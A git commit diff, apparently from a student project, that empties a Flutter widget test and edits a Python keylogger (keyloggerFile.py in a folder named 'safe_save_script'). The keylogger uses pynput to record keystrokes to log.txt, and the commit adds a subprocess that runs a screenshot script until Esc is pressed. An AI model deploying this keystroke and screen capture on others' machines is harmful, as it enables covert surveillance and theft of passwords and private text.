f4655802c61fb813e526cf9398542ec1b4c98c59
Eduard Ghenea <ghenea.geani.d7k@student.ucv.ro>
2023-04-28 12:42:32 +0300

    The script takes ss at a given interval of seconds.
    The config is found in screenshoots file.

--- expenses_app/test/widget_test.dart
+++ expenses_app/test/widget_test.dart
@@ -11,20 +11,7 @@ import 'package:flutter_test/flutter_test.dart';
 import 'package:expenses_app/main.dart';
 
 void main() {
-  testWidgets('Counter increments smoke test', (WidgetTester tester) async {
-    // Build our app and trigger a frame.
-    await tester.pumpWidget(const MyApp());
-
-    // Verify that our counter starts at 0.
-    expect(find.text('0'), findsOneWidget);
-    expect(find.text('1'), findsNothing);
-
-    // Tap the '+' icon and trigger a frame.
-    await tester.tap(find.byIcon(Icons.add));
-    await tester.pump();
-
-    // Verify that our counter has incremented.
+  testWidgets('', (WidgetTester tester) async {
     expect(find.text('0'), findsNothing);
-    expect(find.text('1'), findsOneWidget);
   });
 }
--- safe_save_script/keyloggerFile.py
+++ safe_save_script/keyloggerFile.py
@@ -1,32 +1,32 @@
-import pynput
+import subprocess
 
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
 
 def on_press(key):
-    global keys, count
-
-    keys.append(key)
-    count += 1
-
     print("{0} pressed".format(key))
     write_key_to_file(key)
+
 
 def write_key_to_file(key):
     with open("log.txt", "a") as f:
         k = str(key).replace("'", "")
-        if k == "Key.space" :
+        if k == "Key.space":
             f.write(" ")
         elif k.find(".") > 0:
             f.write("")
         else:
             f.write(k)
 
+
 def on_release(key):
     if key == Key.esc:
+        global ss_procces
+        ss_procces.kill()
         return False
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+
+with Listener(on_press=on_press, on_release=on_release, ) as listener:
     listener.join()
+
+ss_procces=subprocess.Popen("screenshoots.py")
